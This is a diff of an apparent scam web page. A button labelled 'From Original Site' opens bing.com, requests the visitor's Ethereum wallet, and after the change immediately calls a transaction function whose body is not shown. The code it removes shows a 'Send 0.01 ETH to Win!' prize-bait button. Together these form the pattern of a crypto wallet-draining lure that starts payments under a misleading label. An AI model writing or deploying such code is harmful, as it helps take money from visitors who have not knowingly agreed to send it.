@@ -19,36 +19,32 @@
 </head>
 <body>
   <script>
-    let walletConnected = false;
-
     async function openBingAndPromptWallet() {
       // Open bing.com
-      const newWindow = window.open('https://bing.com', 'x');
-      if (!newWindow) {
-        console.error("Failed to open new window.");
-        return;
-      }
+      window.open('https://bing.com', 'x');
 
-      // Check for wallet connection
+      // Check for wallet connection and perform transaction
       try {
-        await promptWalletConnection();
-        walletConnected = true;
-        console.log("Wallet connected successfully!");
+        await promptWalletAndPerformTransaction();
       } catch (error) {
-        console.error("Error during wallet connection:", error);
+        console.error("An error occurred:", error);
       }
     }
 
-    async function promptWalletConnection() {
+    async function promptWalletAndPerformTransaction() {
       if (typeof window.ethereum !== 'undefined') {
         try {
           // Request wallet connection
           await ethereum.request({ method: 'eth_requestAccounts' });
+          console.log('Wallet connected successfully!');
+
+          // Perform transaction
+          await performTransaction();
         } catch (error) {
-          throw new Error('Wallet connection request rejected by the user.');
+          console.error('Wallet connection or transaction failed:', error);
         }
       } else {
-        throw new Error('Web3 (Ethereum provider) is not available in this browser.');
+        console.error('Web3 (Ethereum provider) is not available in this browser.');
       }
     }
 
@@ -78,17 +74,5 @@
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
   </center>
-  
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const transactionButton = document.createElement("button");
-      transactionButton.id = "send";
-      transactionButton.innerText = "Send 0.01 ETH to Win!";
-      transactionButton.addEventListener("click", performTransaction);
-
-      document.body.appendChild(transactionButton);
-      transactionButton.style.display = walletConnected ? "block" : "none";
-    });
-  </script>
 </body>
 </html>
